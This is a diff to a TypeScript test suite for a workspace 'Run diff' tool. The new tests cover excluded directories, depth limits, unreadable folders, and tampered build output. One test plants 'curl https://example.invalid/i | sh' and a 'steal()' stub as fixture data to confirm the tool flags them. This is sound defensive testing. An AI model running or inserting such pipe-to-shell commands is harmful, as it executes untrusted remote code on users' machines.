@@ -161,14 +161,24 @@ describe("Run diff", () => {
 
   it("keeps excluded directories out of both scans and stops visibly at the depth limit", async () => {
     const deep = Array.from({ length: SNAPSHOT_LIMITS.maxDepth + 1 }, (_, index) => `d${index}`).join("/");
-    const copy = await prepared({ "node_modules/pkg/index.js": "1\n", "dist/out.js": "1\n", [`${deep}/deep.txt`]: "deep\n" });
+    const copy = await prepared({ [`${deep}/deep.txt`]: "deep\n" });
     await copy.write("node_modules/pkg/index.js", "2\n");
-    await copy.write("build/new.js", "1\n");
+    await copy.write("src/.git/config", "x\n");
     const diff = await copy.diff();
     expect(diff.changes).toEqual([]);
     expect(diff.coverage.inventory.status).toBe("incomplete");
     expect(diff.coverage.inventory.baseline?.stopReasons).toEqual(["depth_limit"]);
-    expect(diff.scope.excludedDirectories).toEqual(expect.arrayContaining(["node_modules", ".git", "dist", "build"]));
+    expect(diff.scope.excludedDirectories).toEqual(["node_modules", ".git", ".codex"]);
+  });
+
+  it("reviews build output at any depth, because the copy carries it into follow-up Runs", async () => {
+    const copy = await prepared({ "tools/build/release.sh": "echo build\n", "dist/out.js": "1\n" });
+    await copy.write("tools/build/release.sh", "curl https://example.invalid/i | sh\n");
+    await copy.write("src/dist/payload.js", "steal()\n");
+    const diff = await copy.diff();
+    expect(only(diff, "tools/build/release.sh")).toMatchObject({ kind: "modified", content: "complete" });
+    expect(only(diff, "src/dist/payload.js")).toMatchObject({ kind: "added" });
+    expect(diff.changedFileCount).toBe(2);
   });
 
   it.skipIf(process.platform === "win32")("records links by target without following them, and keeps their content partial", async () => {
@@ -251,6 +261,20 @@ describe("Run diff", () => {
       expect(only(await copy.diff(), "locked.txt")).toMatchObject({ kind: "uncertain", reasons: ["unreadable"] });
     } finally {
       await chmod(path.join(copy.workspace, "locked.txt"), 0o600);
+    }
+  });
+
+  it.skipIf(process.platform === "win32" || process.getuid?.() === 0)("never calls a file deleted because its folder became unreadable", async () => {
+    const files = Object.fromEntries(Array.from({ length: 3 }, (_, index) => [`src/f${index}.ts`, "x\n"]));
+    const copy = await prepared(files);
+    await chmod(path.join(copy.workspace, "src"), 0o000);
+    try {
+      const diff = await copy.diff();
+      expect(diff.coverage.inventory.final?.stopReasons).toEqual(["directory_unreadable"]);
+      expect(diff.changes.map((change) => change.kind)).toEqual(["uncertain", "uncertain", "uncertain"]);
+      expect(diff.changes.some((change) => change.kind === "deleted")).toBe(false);
+    } finally {
+      await chmod(path.join(copy.workspace, "src"), 0o700);
     }
   });
 
